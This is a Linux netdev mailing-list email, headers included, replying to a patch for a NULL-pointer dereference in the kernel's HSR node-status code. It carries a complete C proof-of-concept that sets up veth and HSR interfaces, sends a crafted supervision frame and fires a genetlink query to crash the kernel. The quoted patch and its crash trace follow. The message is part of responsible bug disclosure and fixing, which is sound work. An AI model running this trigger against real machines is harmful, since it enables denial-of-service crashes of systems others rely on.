Return-Path: <netdev+bounces-286478-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id wJqSIdqCAWpObwEAu9opvQ
	(envelope-from <netdev+bounces-286478-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Mon, 11 May 2026 09:18:50 +0200
X-Original-To: lists+netdev@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [172.234.253.10])
	by mail.lfdr.de (Postfix) with ESMTPS id E06BC508FFC
	for <lists+netdev@lfdr.de>; Mon, 11 May 2026 09:18:49 +0200 (CEST)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id ADFAC3007F77
	for <lists+netdev@lfdr.de>; Mon, 11 May 2026 07:18:48 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 324EC3644C6;
	Mon, 11 May 2026 07:18:48 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="MBVaSU7i"
X-Original-To: netdev@vger.kernel.org
Received: from mail-pl1-f173.google.com (mail-pl1-f173.google.com [209.85.214.173])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 88265363C57
	for <netdev@vger.kernel.org>; Mon, 11 May 2026 07:18:46 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.214.173
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1778483928; cv=pass; b=Zj60nJoJnnDwT2t+R7UXcXLPT7DRZLcjRjRGwDtDyHdMO1/yT/ghr3g/Ny84wfUPDgtKaA3QDKeZD7XzrajJ6s4hkpooytedjU3RNgMUn5vTx6pjipNwk2Jhb30k7uQb8lQaBGxtewcHPLD90wlNn8aFNmmPsHP4QcQ9/PQJuOo=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1778483928; c=relaxed/simple;
	bh=+tWo1oQ9+UfY8Szwii33XaifsT0b/LWHcpEIDDlu2AI=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=U29pA6scuJ5/fGD6v92X5ny3sf9IZq/0boyXBmQZVZ/uiw8rGOY94l5Fjr39j1VnIisk2uB0V723aC81pZbgZG9pLaaJHUu/7y0Wl7gi2ZaXuvLqvvETyL7gMaF7lTE7IkXzs8J4WEGZwjIFnMjQI0Dr7DaxKUZ0gTymw/cwWyQ=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=MBVaSU7i; arc=pass smtp.client-ip=209.85.214.173
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Received: by mail-pl1-f173.google.com with SMTP id d9443c01a7336-2ba6485d219so24740425ad.3
        for <netdev@vger.kernel.org>; Mon, 11 May 2026 00:18:46 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1778483926; cv=none;
        d=google.com; s=arc-20240605;
        b=Y8sxK+JHblathJ6i+TkfQPY7MHT2u5vL9ZaeZ6tKQf/OS7u4AYNa1QYGTK7HuhGpbb
         p/SVqQbXKgxBuQ6NNEj7TjkeK9yc7t6fAntdTPPX+hhNIVwh4RTt5nuJxIkxEr9fV/Jc
         XGX4lFHrWyb14aF/YZwMRox53iraNZE+FE5EVrdmZmrIuz1yMWAhLosD9dLyjTe39GGA
         v0eMjou1CzYOcJN74Ws27QDkIPAG11Ky6KTuutqFyxQ/Djc8R7jVhX+16V9TLSYSRTZD
         6Vno5a6pgdhaiLM2oytm8ZfF+mrTiF9JuapZrF32OwfkQiBrGl+QlIRc3/tRKNhf29DW
         Ylww==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=PPhvBt08O4Ey6pvpvn2j0f5QZjjxQQeMUoJCNUo1A8c=;
        fh=R66GyqD97wIPpAYdlWBYKedTesGQ2p0XJTiRoa4gmro=;
        b=da2oi/vMv0u3SSPK5fUlef7M+dWz10B2JvY0+yyfmf2MUTPxZRC7cZaUtRM/Mfj1S2
         0HpfTqDziJhwKlHQTKfuaAHo1y6J8uqD8B3a0dmEFY5jIfILj0zEgfXGQltS2xQv1Lh5
         NTC2EJ6GaJAzMmDWiYv3zuxFDkQsxorT04Opq91FNPyhXuMIolxL9XFnl45sJdnVKLr4
         tQXPXguzzkvyi116nBeVmzGFvGwQE6q0Hgd93JtU+x9DRgmleI6a6m0vaV8zIfRirKvM
         0x5IZG09tmYu+kKHP0Hn26llwqKLvGdJDEh3WhHN+SUX060r7Xzu6gQFXmmFNhvRu1Zo
         GrVg==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1778483926; x=1779088726; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=PPhvBt08O4Ey6pvpvn2j0f5QZjjxQQeMUoJCNUo1A8c=;
        b=MBVaSU7iwZrYBEwgpVqbP4ZGUHPLSgKuyZMcmNmFf7j67kPMenfEhH2ebM4qXCwfFF
         6Dxrqjjrbs9nECC9k0Eq/4zTPC0wtWhz4XaGOwKgbEiqX1GVlQhdybBd6vslanpOCFVZ
         Zg/NXWNBl57LI/Vth8sJuMUzrU16SFtNUkKS3Kv97BbCbiP6Ih1mLbSvYtFt9ScBp7uI
         F4k+USbV+TCDX5Sw/G4mbhW2JQas9ogxk3XQNIejzEYaoNGEBFpDxuSqrGzLDndH7KDR
         2OArzymcUtECKa4idniWYDvm5dmBKa0YOHvHoSbEHck7E+c4byusasXa4ZAWFly8h85H
         T69w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1778483926; x=1779088726;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=PPhvBt08O4Ey6pvpvn2j0f5QZjjxQQeMUoJCNUo1A8c=;
        b=nNNgqisVHN0NhYC8PGjfqMQN8Pwp0d/r8Le7D0txDLepqtDRULAouM7DeTQwCOklqo
         yAi8ScValJPNtHhfI8J8M57aIk/bZMJcw7uiMwr1rZC9dmIAAujUSwwJ5hW21RBkqp1g
         j4F7y495Ur0mpiN5v/G0Bu3Gemk0pMF7i8PGkEcVuA7k+WBbTQBBrQgaPO7SYgRmmkRK
         ox5vYjmnpp31rd5SHl1NAQL1Q4U24LQhJFKzmgXdLFQaPuTkHNK56DjszixefGPrPqPx
         klIg7ek6TmFgwQeV9Rqm60i3AP2Ht+zPMTKv/HqK1nBkdzDqCILJDmXGa8bEiAJSisyj
         zHEQ==
X-Gm-Message-State: AOJu0Yw0BRT5hlKF9PZL3jViO9RRF3dhOdWdg3tle8PHT4Aug3Kpj8Ef
	IgKRqFpHTiyTpBgX+66SYTodsgODZ9+eycGfttipl8Cg+VNS4n7Hzx9jQw/AFKOY7TxMczU1PQ6
	oLIM3R80IytfChrPLG7UyWMPGQMt0r79XVLMtqUNWpl/U9LXN+2K1s95KYFo=
X-Gm-Gg: Acq92OGjupCZhby7eAdytLpcwneY5nKyS1/+DuP7RcMVVLRZGrI1NIKO9KCyx/U26Sj
	rQf/fzyYM4Ld2A7gXoFnjuJZLMYVt9Lfr3LDkQFtBxQVJ1eklNdVi2JxPHcxbIccy5BZzpAFjSu
	uxIKfN+jU/rWUYQ21tMeOvSKMdKkDXIyRiN3aXThD50sEYWZqKNI8YLYcB2wRxCXXJp4WNjToal
	/BOHPFa5K9rWUaIUIG6BPNfJRJcRoumGznMLugrnn+5EKJw+c9k+5+vwd8ZblzPUqSHbK9S3BXm
	TaqJnFaJhOuAa3cwCIc=
X-Received: by 2002:a17:903:8c5:b0:2ba:60a:3105 with SMTP id
 d9443c01a7336-2ba78f7812fmr243707685ad.9.1778483925670; Mon, 11 May 2026
 00:18:45 -0700 (PDT)
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260511071517.3013445-1-xmei5@asu.edu>
In-Reply-To: <20260511071517.3013445-1-xmei5@asu.edu>
From: Xiang Mei <xmei5@asu.edu>
Date: Mon, 11 May 2026 00:18:33 -0700
X-Gm-Features: AVHnY4Lr1j5MRE8Jfs-vXihMD-zV8VWM0fVn8lCrM8o6M5SOgVsUgUodgfV6YjI
Message-ID: <CAPpSM+Te4L_Z=rANT_Sg2f4Ng0dqj9LuMdq5BQYXfKS5=JFrag@mail.gmail.com>
Subject: Re: [PATCH net] net: hsr: fix NULL deref in hsr_get_node_data
To: netdev@vger.kernel.org
Cc: fmaurer@redhat.com, kuba@kernel.org, pabeni@redhat.com, 
	edumazet@google.com, davem@davemloft.net, horms@kernel.org, 
	linux-kernel@vger.kernel.org, bestswngs@gmail.com
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
X-Rspamd-Queue-Id: E06BC508FFC
X-Rspamd-Server: lfdr
X-Spamd-Result: default: False [3.34 / 15.00];
	SEM_URIBL(3.50)[asu.edu:email,asu.edu:dkim];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	BAD_REP_POLICIES(0.10)[];
	HAS_LIST_UNSUB(-0.01)[];
	FROM_HAS_DN(0.00)[];
	DMARC_POLICY_ALLOW(0.00)[asu.edu,none];
	FREEMAIL_CC(0.00)[redhat.com,kernel.org,google.com,davemloft.net,vger.kernel.org,gmail.com];
	TAGGED_FROM(0.00)[bounces-286478-lists,netdev=lfdr.de];
	RCVD_TLS_LAST(0.00)[];
	R_DKIM_ALLOW(0.00)[asu.edu:s=google];
	DKIM_TRACE(0.00)[asu.edu:+];
	FORGED_SENDER_MAILLIST(0.00)[];
	RCVD_COUNT_THREE(0.00)[4];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	ASN(0.00)[asn:63949, ipnet:172.234.224.0/19, country:SG];
	MIME_TRACE(0.00)[0:+];
	TO_DN_NONE(0.00)[];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
	MISSING_XM_UA(0.00)[];
	NEURAL_HAM(-0.00)[-0.851];
	TAGGED_RCPT(0.00)[netdev];
	RCPT_COUNT_SEVEN(0.00)[9];
	ARC_ALLOW(0.00)[subspace.kernel.org:s=arc-20240116:i=2];
	R_SPF_ALLOW(0.00)[+ip4:172.234.253.10:c];
	DBL_BLOCKED_OPENRESOLVER(0.00)[sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns,mail.gmail.com:mid,asu.edu:email,asu.edu:dkim]
X-Rspamd-Action: no action

Thanks for your attention to this bug. Here are some resources to help
you trigger the bug.

Required key configs for the poc:
```
CONFIG_HSR=3Dy
CONFIG_VETH=3Dy
```

Here is a PoC trigger that causes the intended crash shown in the
commit message:
```c
#include <arpa/inet.h>
#include <linux/genetlink.h>
#include <linux/if_ether.h>
#include <linux/if_link.h>
#include <linux/if_packet.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/veth.h>
#include <net/if.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define ETH_P_HSR        0x892F
#define ETH_P_PRP        0x88FB
#define HSR_TLV_ANNOUNCE 22

enum { HSR_A_UNSPEC, HSR_A_NODE_ADDR, HSR_A_IFINDEX };
enum { HSR_C_UNSPEC, HSR_C_RING_ERROR, HSR_C_NODE_DOWN,
       HSR_C_GET_NODE_STATUS };

static const uint8_t sup_mcast[6] =3D {0x01,0x15,0x4e,0x00,0x01,0x00};
static const uint8_t src_mac[6]   =3D {0x02,0xaa,0xaa,0xaa,0xaa,0x01};
static const uint8_t node_macA[6] =3D {0x02,0xbb,0xbb,0xbb,0xbb,0x01};

static void die(const char *m) { perror(m); exit(1); }

static struct nlattr *nla_put(struct nlmsghdr *n, int type,
      const void *data, int len)
{
struct nlattr *a =3D (void *)n + NLMSG_ALIGN(n->nlmsg_len);
a->nla_type =3D type;
a->nla_len  =3D NLA_HDRLEN + len;
if (len)
memcpy((char *)a + NLA_HDRLEN, data, len);
n->nlmsg_len =3D NLMSG_ALIGN(n->nlmsg_len) + NLA_ALIGN(a->nla_len);
return a;
}

static struct nlattr *nla_nest(struct nlmsghdr *n, int type)
{
return nla_put(n, type, NULL, 0);
}

static void nla_nest_end(struct nlmsghdr *n, struct nlattr *start)
{
start->nla_len =3D (char *)n + n->nlmsg_len - (char *)start;
}

static int rtnl_talk(int sk, struct nlmsghdr *n)
{
if (send(sk, n, n->nlmsg_len, 0) < 0)
die("send(rtnl)");

char buf[4096];
int len =3D recv(sk, buf, sizeof(buf), 0);
if (len < 0)
die("recv(rtnl)");

struct nlmsghdr *h =3D (void *)buf;
if (h->nlmsg_type =3D=3D NLMSG_ERROR) {
struct nlmsgerr *e =3D NLMSG_DATA(h);
if (e->error)
fprintf(stderr, "rtnl: %s\n", strerror(-e->error));
return e->error;
}
return 0;
}

static int rtnl_open(void)
{
int sk =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
if (sk < 0) die("socket(rtnl)");
struct sockaddr_nl sa =3D { .nl_family =3D AF_NETLINK };
if (bind(sk, (struct sockaddr *)&sa, sizeof(sa)) < 0)
die("bind(rtnl)");
return sk;
}

static int rtnl_seq;

static void newlink_begin(struct nlmsghdr *n, const char *ifname,
  const char *kind, struct nlattr **linkinfo,
  struct nlattr **infodata)
{
struct ifinfomsg *ifm;
n->nlmsg_len   =3D NLMSG_LENGTH(sizeof(*ifm));
n->nlmsg_type  =3D RTM_NEWLINK;
n->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
n->nlmsg_seq   =3D ++rtnl_seq;
ifm =3D NLMSG_DATA(n);
memset(ifm, 0, sizeof(*ifm));
ifm->ifi_family =3D AF_UNSPEC;

nla_put(n, IFLA_IFNAME, ifname, strlen(ifname) + 1);
*linkinfo =3D nla_nest(n, IFLA_LINKINFO);
nla_put(n, IFLA_INFO_KIND, kind, strlen(kind) + 1);
*infodata =3D nla_nest(n, IFLA_INFO_DATA);
}

static void create_veth(int sk, const char *name, const char *peer)
{
char buf[1024] =3D {0};
struct nlmsghdr *n =3D (void *)buf;
struct nlattr *linkinfo, *infodata;

newlink_begin(n, name, "veth", &linkinfo, &infodata);

struct nlattr *peer_nest =3D nla_nest(n, VETH_INFO_PEER);
struct ifinfomsg *p =3D (void *)n + NLMSG_ALIGN(n->nlmsg_len);
memset(p, 0, sizeof(*p));
n->nlmsg_len =3D NLMSG_ALIGN(n->nlmsg_len) + NLMSG_ALIGN(sizeof(*p));
nla_put(n, IFLA_IFNAME, peer, strlen(peer) + 1);
nla_nest_end(n, peer_nest);

nla_nest_end(n, infodata);
nla_nest_end(n, linkinfo);

if (rtnl_talk(sk, n))
exit(1);
}

static void link_up(int sk, const char *name)
{
char buf[256] =3D {0};
struct nlmsghdr *n  =3D (void *)buf;
struct ifinfomsg *ifm;
n->nlmsg_len   =3D NLMSG_LENGTH(sizeof(*ifm));
n->nlmsg_type  =3D RTM_NEWLINK;
n->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
n->nlmsg_seq   =3D ++rtnl_seq;
ifm =3D NLMSG_DATA(n);
memset(ifm, 0, sizeof(*ifm));
ifm->ifi_family =3D AF_UNSPEC;
ifm->ifi_index  =3D if_nametoindex(name);
ifm->ifi_change =3D IFF_UP;
ifm->ifi_flags  =3D IFF_UP;
rtnl_talk(sk, n);
}

static void link_del(int sk, const char *name)
{
char buf[256] =3D {0};
struct nlmsghdr *n  =3D (void *)buf;
struct ifinfomsg *ifm;
n->nlmsg_len   =3D NLMSG_LENGTH(sizeof(*ifm));
n->nlmsg_type  =3D RTM_DELLINK;
n->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
n->nlmsg_seq   =3D ++rtnl_seq;
ifm =3D NLMSG_DATA(n);
memset(ifm, 0, sizeof(*ifm));
ifm->ifi_family =3D AF_UNSPEC;
ifm->ifi_index  =3D if_nametoindex(name);
rtnl_talk(sk, n);
}

static void create_hsr(int sk, const char *name, int slave1, int slave2)
{
char buf[1024] =3D {0};
struct nlmsghdr *n =3D (void *)buf;
struct nlattr *linkinfo, *infodata;

newlink_begin(n, name, "hsr", &linkinfo, &infodata);
nla_put(n, IFLA_HSR_SLAVE1, &slave1, sizeof(slave1));
nla_put(n, IFLA_HSR_SLAVE2, &slave2, sizeof(slave2));
uint8_t ver =3D 1;
nla_put(n, IFLA_HSR_VERSION, &ver, 1);
nla_nest_end(n, infodata);
nla_nest_end(n, linkinfo);

if (rtnl_talk(sk, n))
exit(1);
}

static void send_sup_frame(const char *ifname)
{
struct __attribute__((packed)) {
uint8_t  h_dest[6], h_source[6];
uint16_t h_proto;
uint16_t path_and_LSDU_size, sequence_nr, encap_proto;
uint16_t path_and_HSR_ver, sup_sequence_nr;
uint8_t  tlv_type, tlv_length;
uint8_t  payload_macA[6];
uint8_t  eot_type, eot_length;
} f =3D {0};

int s =3D socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
if (s < 0) die("socket(AF_PACKET)");

struct sockaddr_ll sll =3D {
.sll_family   =3D AF_PACKET,
.sll_protocol =3D htons(ETH_P_HSR),
.sll_ifindex  =3D if_nametoindex(ifname),
.sll_halen    =3D 6,
};
memcpy(sll.sll_addr, sup_mcast, 6);
if (bind(s, (struct sockaddr *)&sll, sizeof(sll)) < 0)
die("bind(AF_PACKET)");

memcpy(f.h_dest, sup_mcast, 6);
memcpy(f.h_source, src_mac, 6);
f.h_proto            =3D htons(ETH_P_HSR);
f.path_and_LSDU_size =3D htons((1 << 12) | 28);
f.sequence_nr        =3D htons(1);
f.encap_proto        =3D htons(ETH_P_PRP);
f.sup_sequence_nr    =3D htons(1);
f.tlv_type           =3D HSR_TLV_ANNOUNCE;
f.tlv_length         =3D 6;
memcpy(f.payload_macA, node_macA, 6);

if (sendto(s, &f, sizeof(f), 0,
   (struct sockaddr *)&sll, sizeof(sll)) < 0)
die("sendto(sup)");
close(s);
}

static int resolve_hsr_family(int sk)
{
char buf[1024] =3D {0};
struct nlmsghdr *n  =3D (void *)buf;
struct genlmsghdr *g;

n->nlmsg_len   =3D NLMSG_LENGTH(sizeof(*g));
n->nlmsg_type  =3D GENL_ID_CTRL;
n->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
g =3D NLMSG_DATA(n);
g->cmd     =3D CTRL_CMD_GETFAMILY;
g->version =3D 1;
nla_put(n, CTRL_ATTR_FAMILY_NAME, "HSR", 4);

if (send(sk, n, n->nlmsg_len, 0) < 0) die("send(genl)");
int len =3D recv(sk, buf, sizeof(buf), 0);
if (len < 0) die("recv(genl)");

struct nlmsghdr *h  =3D (void *)buf;
struct genlmsghdr *gh =3D NLMSG_DATA(h);
int alen =3D h->nlmsg_len - NLMSG_LENGTH(sizeof(*gh));
struct nlattr *a =3D (void *)gh + NLMSG_ALIGN(sizeof(*gh));
while (alen > 0 && a->nla_len) {
if (a->nla_type =3D=3D CTRL_ATTR_FAMILY_ID)
return *(uint16_t *)((char *)a + NLA_HDRLEN);
int step =3D NLA_ALIGN(a->nla_len);
a =3D (void *)a + step;
alen -=3D step;
}
fprintf(stderr, "HSR family not found\n");
exit(1);
}

static void trigger(int sk, int family_id, int hsr_ifindex)
{
char buf[256] =3D {0};
struct nlmsghdr *n  =3D (void *)buf;
struct genlmsghdr *g;

n->nlmsg_len   =3D NLMSG_LENGTH(sizeof(*g));
n->nlmsg_type  =3D family_id;
n->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
g =3D NLMSG_DATA(n);
g->cmd     =3D HSR_C_GET_NODE_STATUS;
g->version =3D 1;
nla_put(n, HSR_A_IFINDEX,   &hsr_ifindex, sizeof(hsr_ifindex));
nla_put(n, HSR_A_NODE_ADDR, node_macA,    6);

send(sk, n, n->nlmsg_len, 0);
}

int main(void)
{
int rsk =3D rtnl_open();

create_veth(rsk, "v0", "v1");
create_veth(rsk, "v2", "v3");
link_up(rsk, "v0"); link_up(rsk, "v1");
link_up(rsk, "v2"); link_up(rsk, "v3");

create_hsr(rsk, "hsr0", if_nametoindex("v0"), if_nametoindex("v2"));
link_up(rsk, "hsr0");

int hsr_ifindex =3D if_nametoindex("hsr0");
if (!hsr_ifindex) die("if_nametoindex(hsr0)");

usleep(200 * 1000);              /* let carrier propagate */
send_sup_frame("v1");            /* sets addr_B_port =3D SLAVE_A */
usleep(200 * 1000);              /* let kernel process the frame */

link_del(rsk, "v0");             /* slave_a port goes away */
usleep(200 * 1000);              /* let RCU drain */

int gsk =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
if (gsk < 0) die("socket(genl)");

int fid =3D resolve_hsr_family(gsk);
trigger(gsk, fid, hsr_ifindex);  /* boom */

puts("[*] survived -- bug did not trigger");
return 0;
}
```

Feel free to ask any questions.
Thanks,
Xiang

On Mon, May 11, 2026 at 12:15=E2=80=AFAM Xiang Mei <xmei5@asu.edu> wrote:
>
> hsr_get_node_data() looks up a node's address-B port and dereferences
> port->dev->ifindex without checking the return value of
> hsr_port_get_hsr(), which returns NULL when no port of the requested
> type is currently attached.
>
> node->addr_B_port is set by hsr_handle_sup_frame() on every supervision
> frame but is never cleared when the corresponding slave is removed.
> If one slave of an HSR master is unregistered while the master stays
> alive (the other slave keeps it up), node_db entries retain a stale
> addr_B_port. An unprivileged HSR_C_GET_NODE_STATUS query (genl op has
> .flags =3D 0) then crashes the kernel:
>
>   Oops: general protection fault, probably for non-canonical address
>   0xdffffc0000000002: 0000 [#1] SMP KASAN NOPTI
>   KASAN: null-ptr-deref in range [0x0000000000000010-0x0000000000000017]
>   RIP: 0010:hsr_get_node_data (net/hsr/hsr_framereg.c:892)
>   Call Trace:
>    hsr_get_node_status (net/hsr/hsr_netlink.c:366)
>    genl_family_rcv_msg_doit (net/netlink/genetlink.c:1114)
>    genl_rcv_msg (net/netlink/genetlink.c:1209)
>    netlink_rcv_skb (net/netlink/af_netlink.c:2550)
>    netlink_unicast (net/netlink/af_netlink.c:1344)
>    netlink_sendmsg (net/netlink/af_netlink.c:1894)
>    __sys_sendto (net/socket.c:2265)
>
> Default *addr_b_ifindex to -1 and only overwrite it when the port
> lookup succeeds. The caller hsr_get_node_status() already treats
> addr_b_ifindex =3D=3D -1 as "no address-B port" when emitting the
> HSR_A_NODE_ADDR_B / HSR_A_ADDR_B_IFINDEX attributes, so behavior is
> unchanged for valid setups.
>
> Fixes: c5a759117210 ("net/hsr: Use list_head (and rcu) instead of array f=
or slave devices.")
> Reported-by: Weiming Shi <bestswngs@gmail.com>
> Assisted-by: Claude:claude-opus-4-7
> Signed-off-by: Xiang Mei <xmei5@asu.edu>
> ---
>  net/hsr/hsr_framereg.c | 6 +++---
>  1 file changed, 3 insertions(+), 3 deletions(-)
>
> diff --git a/net/hsr/hsr_framereg.c b/net/hsr/hsr_framereg.c
> index d09875b33588..8018d5c0c878 100644
> --- a/net/hsr/hsr_framereg.c
> +++ b/net/hsr/hsr_framereg.c
> @@ -887,11 +887,11 @@ int hsr_get_node_data(struct hsr_priv *hsr,
>         if (hsr->prot_version !=3D PRP_V1)
>                 fill_last_seq_nrs(node, if1_seq, if2_seq);
>
> +       *addr_b_ifindex =3D -1;
>         if (node->addr_B_port !=3D HSR_PT_NONE) {
>                 port =3D hsr_port_get_hsr(hsr, node->addr_B_port);
> -               *addr_b_ifindex =3D port->dev->ifindex;
> -       } else {
> -               *addr_b_ifindex =3D -1;
> +               if (port)
> +                       *addr_b_ifindex =3D port->dev->ifindex;
>         }
>
>         return 0;
> --
> 2.43.0
>

